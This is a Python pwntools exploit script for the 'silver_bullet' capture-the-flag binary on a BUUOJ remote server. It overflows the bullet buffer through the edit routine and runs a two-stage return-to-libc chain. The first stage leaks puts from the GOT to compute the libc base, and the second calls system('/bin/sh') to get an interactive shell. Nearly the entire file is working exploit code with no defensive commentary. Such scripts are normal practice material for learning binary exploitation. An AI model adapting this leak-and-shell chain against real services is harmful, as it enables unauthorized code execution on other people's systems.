# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './silver_bullet'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23-32-buu.so')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25805'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(text):
    cmd(1)
    sa(' bullet :' , text)

def edit(text):
    cmd(2)
    sa(' bullet :' , text)

# one_gad = one_gadget(libc.path)

def attack():
    
    # 因为本题有的写入方式有0截断，所以 payload 不能含有 \x00

    mian_addr = 0x08048954
    puts_got = elf.got['puts']
    puts_plt = elf.plt['puts']

    add('a'*0x2f)
    edit('a')

    payload = '\xff'*3 
    payload+= flat(
        0xdeadbeaf ,
        puts_plt,
        mian_addr,
        puts_got
    )

    edit(payload)
    cmd(3)
    
    libc.address = l32() - libc.sym['puts']
    system_addr = libc.sym['system']
    binsh_addr = libc.search('/bin/sh\x00').next()

    add('a'*0x2f)
    edit('a')

    payload = '\xff'*3 
    payload+= flat(
        0xdeadbeaf ,
        system_addr,
        0xdeadbeaf,
        binsh_addr
    )

    edit(payload)
    cmd(3)
    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   silver_bullet.py
@Time    :   2022/02/10 14:06:57
@Author  :   Niyah 
'''